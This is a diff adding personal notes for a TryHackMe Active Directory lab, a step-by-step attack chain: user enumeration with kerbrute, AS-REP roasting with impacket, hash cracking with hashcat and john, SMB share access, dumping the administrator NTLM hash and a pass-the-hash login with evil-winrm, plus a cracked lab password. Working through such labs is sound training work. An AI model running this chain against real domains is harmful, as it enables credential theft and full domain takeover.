@@ -1,0 +1,72 @@
+Steps 
+Step 1) Connect to tryhackme network
+
+Step 2)
+enum4linux -a IP >> enum.txt
+  
+  Domain name: THM-AD
+  invalid TLD: .local
+
+Step3 )
+
+Kerberos
+(Not reccomended to brute force user accounts due to lockout policies and other issues) (Doing it here bc its a lab)
+
+Brute force with a premade userlist and known Domain Name
+/opt/kerbrute_linux_amd64 userenum -d spookysec.local --dc 10.10.239.51 userlist.txt
+
+Users obtained:
+
+
+
+
+
+Step 4)
+Retrieving Kerberos Tickets
+/opt/impacket/exampels/GetNPUsers.py -dc-ip 10.10.239.51 spookysec.local/ -userfile targetusers.txt -no-pass (SHould work, not tested)
+/opt/impacket/exampels/GetNPUsers.py -dc-ip 10.10.239.51 spookysec.local/svc-admin -no-pass
+
+
+
+Step5)
+Crack the hash
+
+Save hash to file. 
+AS_REP Roasting. 
+hashcat -m 18200 hashfile.txt passwordfile
+hashcat -m 18200 ./hash.txt ./password.txt 
+OR
+john hash.txt --wordlist=~/Documents/thm/attacktivedirectory/passwordlist.txt
+
+Hash cracked and credentials for service account obtained
+svc-admin:management2005
+
+
+
+Step 6)
+smbenumeration
+
+smbclient -L 10.10.239.51 -U "svc-admin"
+  It will prompt for password then list the available shares
+smbclient \\\\10.10.239.51\\backup -U "svc-admin"
+
+This had file with base64 encrypted credentials for backup user
+
+
+Step 7)
+Elevating Privileges within Domain
+
+Using secretsdump.py
+
+Grab the NTLM hash of the administrator 
+EX:
+Administrator:500:hashstuff...................:NTLMhash................:::
+
+evil-winrm -u administrator -H NTLMHASH -i 10.10.239.51
+once logged in check Desktop directories for flags. 
+
+
+
+
+
+
